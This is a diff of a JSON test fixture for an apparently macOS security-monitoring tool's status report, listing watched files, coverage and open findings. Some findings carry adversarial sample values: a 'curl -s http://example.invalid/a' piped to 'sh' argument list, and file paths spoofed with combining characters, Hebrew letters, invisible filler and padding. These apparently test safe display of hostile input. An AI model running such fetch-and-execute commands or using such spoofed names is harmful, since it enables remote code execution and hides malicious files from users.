@@ -1,406 +1,482 @@
 {
- "format": 1,
- "operation": "status",
- "ok": true,
- "errors": [],
- "result": {
-  "generated_at": "2026-11-13T11:40:00Z",
+  "format": 1,
+  "answered_at": 1794570000,
+  "store_id": null,
   "running": false,
   "store": {
-   "path_text": "/Users/example/Library/Application Support/ai.nuanu.immune/store.db",
-   "exists": true
+    "path_text": "/Users/example/Library/Application Support/ai.nuanu.immune/store.db",
+    "exists": true
   },
   "cannot_judge": [
-   "no threat is matched against the estate yet"
+    "no threat is matched against the estate yet"
   ],
-  "last_run": {
-   "id": "1794569400-000000004",
-   "started_at": "2026-11-13T11:36:40Z",
-   "finished_at": "2026-11-13T11:37:05Z",
-   "finished": true
-  },
-  "last_finished_run": {
-   "id": "1794569400-000000004",
-   "started_at": "2026-11-13T11:36:40Z",
-   "finished_at": "2026-11-13T11:37:05Z",
-   "first_run": false,
-   "readings": {
-    "partial": 2,
-    "failed": 0,
-    "not_repeated": 0,
-    "machines_unread": 0
-   },
-   "since_previous_run": null,
-   "unknown": []
-  },
-  "estate": {
-   "machines": 3,
-   "servers": 2,
-   "servers_offered": 1,
-   "servers_read": 0,
-   "machines_set_aside": 0,
-   "machines_seen_after_owner_word": 0,
-   "checkouts": 7,
-   "components": 812
-  },
-  "watched": {
-   "files": 12,
-   "first_reading": false,
-   "since_last_reading": {
-    "new": 0,
-    "changed": 0,
-    "gone": 0
-   },
-   "kinds": [
-    {
-     "kind": "autostart item",
-     "files": 5,
-     "coverage": "full",
-     "readings": {
-      "full": 1,
-      "partial": 0,
-      "none": 0
-     },
-     "reason_text": null
-    },
-    {
-     "kind": "shell profile",
-     "files": 3,
-     "coverage": "full",
-     "readings": {
-      "full": 1,
-      "partial": 0,
-      "none": 0
-     },
-     "reason_text": null
-    },
-    {
-     "kind": "ssh access file",
-     "files": 0,
-     "coverage": null,
-     "readings": {
-      "full": 0,
-      "partial": 0,
-      "none": 0
-     },
-     "reason_text": null
-    },
-    {
-     "kind": "git hook",
-     "files": 4,
-     "coverage": "partial",
-     "readings": {
-      "full": 6,
-      "partial": 1,
-      "none": 0
-     },
-     "reason_text": ".git is a file, as in a worktree or a submodule: the hooks are kept elsewhere and were not read"
-    }
-   ],
-   "content_not_read": 0,
-   "changes": [],
-   "changes_total": 0
-  },
-  "threats": {
-   "outcome": "read",
-   "entries": 1700,
-   "first_reading": true,
-   "new": 0,
-   "gone": 0,
-   "read_at": "2026-11-10T10:00:01Z",
-   "checked_at": "2026-11-10T10:00:01Z",
-   "source": "cisa-kev",
-   "matched": false
-  },
-  "coverage": {
-   "readings": 20,
-   "full": 12,
-   "read_nothing": 6,
-   "partial": 2,
-   "failed": 0,
-   "problems": [
-    {
-     "class": "partial",
-     "reader": "lockfiles",
-     "kind": "lockfile dependencies",
-     "reason_text": "not supported yet: uv.lock",
-     "count": 1,
-     "examples_text": [
-      "checkout:machine:example-mac/work/alpha"
-     ]
-    },
-    {
-     "class": "partial",
-     "reader": "watched-places",
-     "kind": "hooks in the checkout's .git folder",
-     "reason_text": ".git is a file, as in a worktree or a submodule: the hooks are kept elsewhere and were not read",
-     "count": 1,
-     "examples_text": [
-      "checkout:machine:example-mac/work/alpha-worktree"
-     ]
-    },
-    {
-     "class": "read_nothing",
-     "reader": "watched-places",
-     "kind": "hooks in the checkout's .git folder",
-     "reason_text": "the checkout has no hooks",
-     "count": 6,
-     "examples_text": [
-      "checkout:machine:example-mac/work/beta",
-      "checkout:machine:example-mac/work/gamma",
-      "checkout:machine:example-mac/work/delta"
-     ]
-    }
-   ],
-   "problems_total": 3
-  },
-  "not_computed": [],
-  "needs_a_look": [
-   {
-    "id": "fa000000001",
-    "type": "finding",
-    "kind": "autostart item",
-    "severity": "medium",
-    "urgent": true,
-    "state": "open",
-    "first_seen": "2026-11-13T11:37:00Z",
-    "last_seen": "2026-11-13T11:37:00Z",
-    "title": "A program set to start by itself on this Mac was added, changed or removed.",
-    "meaning": "Meaning from the program.",
-    "advice": "Advice from the program.",
-    "value_text": null,
-    "where_text": "/Users/example/Library/LaunchAgents/com.example.a\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u030d\u0346\u0361\u0489\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359\u0316\u0353\u0359.plist",
-    "rule": "watched.autostart",
-    "confidence": "low",
-    "change": "new"
-   },
-   {
-    "id": "fa5b0f00c1d",
-    "type": "finding",
-    "kind": "program start matched by a published rule",
-    "severity": "high",
-    "urgent": true,
-    "state": "open",
-    "first_seen": "2026-11-13T11:30:12Z",
-    "last_seen": "2026-11-13T11:30:12Z",
-    "title": "A program started on this Mac in a way that a published detection rule marks as high risk.",
-    "meaning": "Meaning from the program.",
-    "advice": "Advice from the program.",
-    "value_text": null,
-    "where_text": "example-mac",
-    "rule": "sigma:example-binary-padding",
-    "confidence": "low",
-    "change": "new",
-    "published_rule": {
-     "title_text": "Binary Padding - MacOS",
-     "author_text": "A. Author",
-     "evidence": [
-      {
-       "timestamp_text": "2026-11-13T11:30:12.402Z",
-       "executable_text": "/Users/example/Library/Caches/x/payload",
-       "args_text": [
-        "/usr/libexec/xpcproxy",
-        "com.apple.Safari.SafeBrowsing"
-       ],
-       "parent_executable_text": "/bin/sh",
-       "working_directory_text": "/Users/example",
-       "pid": 4343,
-       "parent_pid": 4200,
-       "user_id": 501,
-       "signing_id_text": null,
-       "team_id_text": null,
-       "platform_binary": false
-      }
-     ]
-    }
-   },
-   {
-    "id": "fa000000002",
-    "type": "finding",
-    "kind": "autostart item",
-    "severity": "medium",
-    "urgent": false,
-    "state": "open",
-    "first_seen": "2026-11-13T11:36:00Z",
-    "last_seen": "2026-11-13T11:36:00Z",
-    "title": "A program set to start by itself on this Mac was added, changed or removed.",
-    "meaning": "Meaning from the program.",
-    "advice": "Advice from the program.",
-    "value_text": null,
-    "where_text": "/\u05d0/tmp/\u05d1/evil.sh/\u05d2/Users/example/Library/LaunchAgents/com.apple.plist",
-    "rule": "watched.autostart",
-    "confidence": "low",
-    "change": "new"
-   },
-   {
-    "id": "fa000000003",
-    "type": "finding",
-    "kind": "program start matched by a published rule",
-    "severity": "medium",
-    "urgent": false,
-    "state": "open",
-    "first_seen": "2026-11-13T11:35:00Z",
-    "last_seen": "2026-11-13T11:35:00Z",
-    "title": "A program started on this Mac in a way that a published detection rule marks.",
-    "meaning": "Meaning from the program.",
-    "advice": "Advice from the program.",
-    "value_text": null,
-    "where_text": "example-mac",
-    "rule": "sigma:example",
-    "confidence": "low",
-    "change": "new",
-    "published_rule": {
-     "title_text": "An invented rule",
-     "evidence": [
-      {
-       "executable_text": "/usr/bin/env",
-       "args_text": [
-        "\u05d0",
-        "curl",
-        "-s",
-        "http://example.invalid/a",
-        "\u05d1",
-        "sh",
-        "\u05d2",
-        "echo",
-        "ok"
-       ],
-       "parent_executable_text": "/bin/sh",
-       "working_directory_text": "/Users/example"
-      }
-     ]
-    }
-   },
-   {
-    "id": "fa000000004",
-    "type": "finding",
-    "kind": "shell profile",
-    "severity": "medium",
-    "urgent": false,
-    "state": "open",
-    "first_seen": "2026-11-13T11:34:00Z",
-    "last_seen": "2026-11-13T11:34:00Z",
-    "title": "A file your terminal runs every time it starts was added, changed or removed.",
-    "meaning": "Meaning from the program.",
-    "advice": "Advice from the program.",
-    "value_text": null,
-    "where_text": "/Users/example/.zsh\u3164rc",
-    "rule": "watched.shell-profile",
-    "confidence": "low",
-    "change": "changed"
-   },
-   {
-    "id": "fa000000005",
-    "type": "finding",
-    "kind": "git hook",
-    "severity": "low",
-    "urgent": false,
-    "state": "open",
-    "first_seen": "2026-11-13T11:33:00Z",
-    "last_seen": "2026-11-13T11:33:00Z",
-    "title": "A git hook was added or changed.",
-    "meaning": "Meaning from the program.",
-    "advice": "Advice from the program.",
-    "value_text": null,
-    "where_text": "~/dev/x/.git/hooks/pre-commit\u00a0\u00a0\u00a0Harmless",
-    "rule": "watched.git-hook",
-    "confidence": "low",
-    "change": "new"
-   }
-  ],
-  "needs_a_look_total": 6,
   "answers_note": "Marking a finding expected or seen is the owner's answer: it hides the finding from him. An agent must not give it on the owner's behalf; it may show the owner the command to give it.",
+  "not_computed": [],
   "this_mac": {
-   "state": "watched",
-   "live": true,
-   "checked_at": "2026-11-13T11:37:05Z",
-   "live_read_at": "2026-11-13T11:40:10Z",
-   "watched": [
-    {
-     "what": "startup items",
-     "count": 3,
-     "how": "live"
+    "state": "watched",
+    "live": true,
+    "checked_at": 1794569825,
+    "live_read_at": 1794570010,
+    "watched": [
+      {
+        "what": "startup items",
+        "count": 3,
+        "how": "live"
+      },
+      {
+        "what": "shell startup files",
+        "count": 1,
+        "how": "live"
+      },
+      {
+        "what": "SSH files",
+        "count": 1,
+        "how": "live"
+      },
+      {
+        "what": "running programs and their connections",
+        "count": 12,
+        "how": "sampled"
+      },
+      {
+        "what": "project packages",
+        "count": 3,
+        "how": "hourly"
+      },
+      {
+        "what": "applications",
+        "count": 41,
+        "how": "hourly"
+      }
+    ],
+    "fresh": true,
+    "stale_reason": null,
+    "fresh_for_seconds": 7200
+  },
+  "event_level": {
+    "state": "running",
+    "program_starts": {
+      "last_day": 1904,
+      "since_check": 31
     },
-    {
-     "what": "shell startup files",
-     "count": 1,
-     "how": "live"
-    },
-    {
-     "what": "SSH files",
-     "count": 1,
-     "how": "live"
-    },
-    {
-     "what": "running programs and their connections",
-     "count": 12,
-     "how": "sampled"
-    },
-    {
-     "what": "project packages",
-     "count": 3,
-     "how": "hourly"
-    },
-    {
-     "what": "applications",
-     "count": 41,
-     "how": "hourly"
+    "read_at": 1794570052,
+    "in_words": {
+      "state": "on",
+      "notes": [],
+      "caveats": []
     }
-   ]
   },
   "not_covered": [
-   {
-    "id": "n-locks",
-    "scope": "projects",
-    "kind": "no reader",
-    "title": "Some project lockfiles are not read by this version",
-    "meaning": "Meaning from the program.",
-    "advice": "Advice from the program.",
-    "count": 2,
-    "since": "2026-11-09T22:00:05Z",
-    "value_text": null,
-    "examples_text": [],
-    "who": "nothing"
-   },
-   {
-    "id": "n-threats",
-    "scope": "threats",
-    "kind": "not matched",
-    "title": "Known exploited vulnerabilities are not matched yet",
-    "meaning": "Meaning from the program.",
-    "advice": "Advice from the program.",
-    "count": 1,
-    "since": null,
-    "value_text": null,
-    "examples_text": [],
-    "who": "nothing"
-   },
-   {
-    "id": "n-feed",
-    "scope": "threats",
-    "kind": "threat list not downloaded",
-    "title": "The vulnerability list could not be downloaded; it is tried again",
-    "meaning": "Meaning from the program.",
-    "advice": "Advice from the program.",
-    "count": 1,
-    "since": "2026-11-09T22:00:05Z",
-    "value_text": "the network is unreachable",
-    "examples_text": []
-   }
+    {
+      "id": "n-locks",
+      "scope": "projects",
+      "kind": "no reader",
+      "title": "Some project lockfiles are not read by this version",
+      "meaning": "Meaning from the program.",
+      "advice": "Advice from the program.",
+      "count": 2,
+      "value_text": null,
+      "examples_text": [],
+      "who": "nothing",
+      "since_at": 1794261605,
+      "holds_on": "this_mac"
+    },
+    {
+      "id": "n-threats",
+      "scope": "threats",
+      "kind": "not matched",
+      "title": "Known exploited vulnerabilities are not matched yet",
+      "meaning": "Meaning from the program.",
+      "advice": "Advice from the program.",
+      "count": 1,
+      "value_text": null,
+      "examples_text": [],
+      "who": "nothing",
+      "since_at": null,
+      "holds_on": "every_mac"
+    },
+    {
+      "id": "n-feed",
+      "scope": "threats",
+      "kind": "threat list not downloaded",
+      "title": "The vulnerability list could not be downloaded; it is tried again",
+      "meaning": "Meaning from the program.",
+      "advice": "Advice from the program.",
+      "count": 1,
+      "value_text": "the network is unreachable",
+      "examples_text": [],
+      "since_at": 1794261605,
+      "holds_on": "this_mac"
+    }
   ],
-  "not_covered_total": 3,
-  "event_level": {
-   "state": "running",
-   "program_starts": {
-    "last_day": 1904,
-    "since_check": 31
-   },
-   "read_at": "2026-11-13T11:40:52Z",
-   "in_words": {
-    "state": "on",
-    "notes": [],
-    "caveats": []
-   }
+  "last_run": {
+    "id": "1794569400-000000004",
+    "started_at": 1794569800,
+    "finished_at": 1794569825
+  },
+  "last_finished_run": {
+    "check": {
+      "id": "1794569400-000000004",
+      "started_at": 1794569800,
+      "finished_at": 1794569825
+    },
+    "first_run": false,
+    "readings": {
+      "partial": 2,
+      "failed": 0,
+      "not_repeated": 0,
+      "machines_unread": 0
+    },
+    "since_previous_run": null,
+    "unknown": []
+  },
+  "estate": {
+    "machines": 3,
+    "servers": 2,
+    "servers_offered": 1,
+    "servers_read": 0,
+    "machines_set_aside": 0,
+    "checkouts": 7,
+    "components": 812,
+    "machines_seen_after_owner_word_text": []
+  },
+  "watched": {
+    "files": 12,
+    "first_reading": false,
+    "since_last_reading": {
+      "new": 0,
+      "changed": 0,
+      "gone": 0
+    },
+    "kinds": [
+      {
+        "kind": "autostart item",
+        "files": 5,
+        "coverage": "full",
+        "readings": {
+          "full": 1,
+          "partial": 0,
+          "none": 0
+        },
+        "reason_text": null
+      },
+      {
+        "kind": "shell profile",
+        "files": 3,
+        "coverage": "full",
+        "readings": {
+          "full": 1,
+          "partial": 0,
+          "none": 0
+        },
+        "reason_text": null
+      },
+      {
+        "kind": "ssh access file",
+        "files": 0,
+        "coverage": null,
+        "readings": {
+          "full": 0,
+          "partial": 0,
+          "none": 0
+        },
+        "reason_text": null
+      },
+      {
+        "kind": "git hook",
+        "files": 4,
+        "coverage": "partial",
+        "readings": {
+          "full": 6,
+          "partial": 1,
+          "none": 0
+        },
+        "reason_text": ".git is a file, as in a worktree or a submodule: the hooks are kept elsewhere and were not read"
+      }
+    ],
+    "content_not_read": 0,
+    "changes": [],
+    "changes_total": 0
+  },
+  "threats": {
+    "outcome": "read",
+    "entries": 1700,
+    "first_reading": true,
+    "new": 0,
+    "gone": 0,
+    "read_at": 1794304801,
+    "checked_at": 1794304801,
+    "source": "cisa-kev",
+    "matched": false
+  },
+  "coverage": {
+    "readings": 20,
+    "full": 12,
+    "read_nothing": 6,
+    "partial": 2,
+    "failed": 0,
+    "problems": [
+      {
+        "class": "partial",
+        "reader": "lockfiles",
+        "kind": "lockfile dependencies",
+        "reason_text": "not supported yet: uv.lock",
+        "count": 1,
+        "examples_text": [
+          "checkout:machine:example-mac/work/alpha"
+        ]
+      },
+      {
+        "class": "partial",
+        "reader": "watched-places",
+        "kind": "hooks in the checkout's .git folder",
+        "reason_text": ".git is a file, as in a worktree or a submodule: the hooks are kept elsewhere and were not read",
+        "count": 1,
+        "examples_text": [
+          "checkout:machine:example-mac/work/alpha-worktree"
+        ]
+      },
+      {
+        "class": "read_nothing",
+        "reader": "watched-places",
+        "kind": "hooks in the checkout's .git folder",
+        "reason_text": "the checkout has no hooks",
+        "count": 6,
+        "examples_text": [
+          "checkout:machine:example-mac/work/beta",
+          "checkout:machine:example-mac/work/gamma",
+          "checkout:machine:example-mac/work/delta"
+        ]
+      }
+    ],
+    "problems_total": 3,
+    "unreached": []
+  },
+  "needs_a_look": {
+    "items": [
+      {
+        "finding": {
+          "finding": {
+            "id": "fa000000001",
+            "rule": "watched.autostart",
+            "about_text": "",
+            "state": "open",
+            "severity": "medium",
+            "confidence": "low",
+            "urgent": true
+          },
+          "kind": "autostart item",
+          "title": "A program set to start by itself on this Mac was added, changed or removed.",
+          "where_text": "/Users/example/Library/LaunchAgents/com.example.a̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̍͆͡҉̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙̖͓͙.plist",
+          "first_seen_at": 1794569820,
+          "last_seen_at": 1794569820,
+          "answer": null,
+          "verdicts": null
+        },
+        "meaning": "Meaning from the program.",
+        "advice": "Advice from the program.",
+        "value_text": null,
+        "technique_text": null,
+        "change": "new",
+        "evidence": null
+      },
+      {
+        "finding": {
+          "finding": {
+            "id": "fa5b0f00c1d",
+            "rule": "sigma:example-binary-padding",
+            "about_text": "",
+            "state": "open",
+            "severity": "high",
+            "confidence": "low",
+            "urgent": true
+          },
+          "kind": "program start matched by a published rule",
+          "title": "A program started on this Mac in a way that a published detection rule marks as high risk.",
+          "where_text": "example-mac",
+          "first_seen_at": 1794569412,
+          "last_seen_at": 1794569412,
+          "answer": null,
+          "verdicts": null
+        },
+        "meaning": "Meaning from the program.",
+        "advice": "Advice from the program.",
+        "value_text": null,
+        "technique_text": null,
+        "change": "new",
+        "evidence": {
+          "published_rule_matched": {
+            "rule": {
+              "title_text": "Binary Padding - MacOS",
+              "author_text": "A. Author"
+            },
+            "events": [
+              {
+                "program_start": {
+                  "happened_at": 1794569412,
+                  "process": {
+                    "executable_text": "/Users/example/Library/Caches/x/payload",
+                    "signing_id_text": null,
+                    "team_id_text": null,
+                    "pid": 4343
+                  },
+                  "instigator": {
+                    "executable_text": "/bin/sh"
+                  },
+                  "args_text": [
+                    "/usr/libexec/xpcproxy",
+                    "com.apple.Safari.SafeBrowsing"
+                  ],
+                  "working_directory_text": "/Users/example",
+                  "script_text": null
+                }
+              }
+            ]
+          }
+        }
+      },
+      {
+        "finding": {
+          "finding": {
+            "id": "fa000000002",
+            "rule": "watched.autostart",
+            "about_text": "",
+            "state": "open",
+            "severity": "medium",
+            "confidence": "low",
+            "urgent": false
+          },
+          "kind": "autostart item",
+          "title": "A program set to start by itself on this Mac was added, changed or removed.",
+          "where_text": "/א/tmp/ב/evil.sh/ג/Users/example/Library/LaunchAgents/com.apple.plist",
+          "first_seen_at": 1794569760,
+          "last_seen_at": 1794569760,
+          "answer": null,
+          "verdicts": null
+        },
+        "meaning": "Meaning from the program.",
+        "advice": "Advice from the program.",
+        "value_text": null,
+        "technique_text": null,
+        "change": "new",
+        "evidence": null
+      },
+      {
+        "finding": {
+          "finding": {
+            "id": "fa000000003",
+            "rule": "sigma:example",
+            "about_text": "",
+            "state": "open",
+            "severity": "medium",
+            "confidence": "low",
+            "urgent": false
+          },
+          "kind": "program start matched by a published rule",
+          "title": "A program started on this Mac in a way that a published detection rule marks.",
+          "where_text": "example-mac",
+          "first_seen_at": 1794569700,
+          "last_seen_at": 1794569700,
+          "answer": null,
+          "verdicts": null
+        },
+        "meaning": "Meaning from the program.",
+        "advice": "Advice from the program.",
+        "value_text": null,
+        "technique_text": null,
+        "change": "new",
+        "evidence": {
+          "published_rule_matched": {
+            "rule": {
+              "title_text": "An invented rule",
+              "author_text": null
+            },
+            "events": [
+              {
+                "program_start": {
+                  "happened_at": null,
+                  "process": {
+                    "executable_text": "/usr/bin/env",
+                    "signing_id_text": null,
+                    "team_id_text": null,
+                    "pid": null
+                  },
+                  "instigator": {
+                    "executable_text": "/bin/sh"
+                  },
+                  "args_text": [
+                    "א",
+                    "curl",
+                    "-s",
+                    "http://example.invalid/a",
+                    "ב",
+                    "sh",
+                    "ג",
+                    "echo",
+                    "ok"
+                  ],
+                  "working_directory_text": "/Users/example",
+                  "script_text": null
+                }
+              }
+            ]
+          }
+        }
+      },
+      {
+        "finding": {
+          "finding": {
+            "id": "fa000000004",
+            "rule": "watched.shell-profile",
+            "about_text": "",
+            "state": "open",
+            "severity": "medium",
+            "confidence": "low",
+            "urgent": false
+          },
+          "kind": "shell profile",
+          "title": "A file your terminal runs every time it starts was added, changed or removed.",
+          "where_text": "/Users/example/.zshㅤrc",
+          "first_seen_at": 1794569640,
+          "last_seen_at": 1794569640,
+          "answer": null,
+          "verdicts": null
+        },
+        "meaning": "Meaning from the program.",
+        "advice": "Advice from the program.",
+        "value_text": null,
+        "technique_text": null,
+        "change": "changed",
+        "evidence": null
+      },
+      {
+        "finding": {
+          "finding": {
+            "id": "fa000000005",
+            "rule": "watched.git-hook",
+            "about_text": "",
+            "state": "open",
+            "severity": "low",
+            "confidence": "low",
+            "urgent": false
+          },
+          "kind": "git hook",
+          "title": "A git hook was added or changed.",
+          "where_text": "~/dev/x/.git/hooks/pre-commit   Harmless",
+          "first_seen_at": 1794569580,
+          "last_seen_at": 1794569580,
+          "answer": null,
+          "verdicts": null
+        },
+        "meaning": "Meaning from the program.",
+        "advice": "Advice from the program.",
+        "value_text": null,
+        "technique_text": null,
+        "change": "new",
+        "evidence": null
+      }
+    ],
+    "total": 6,
+    "urgent_total": 2
   }
- }
 }
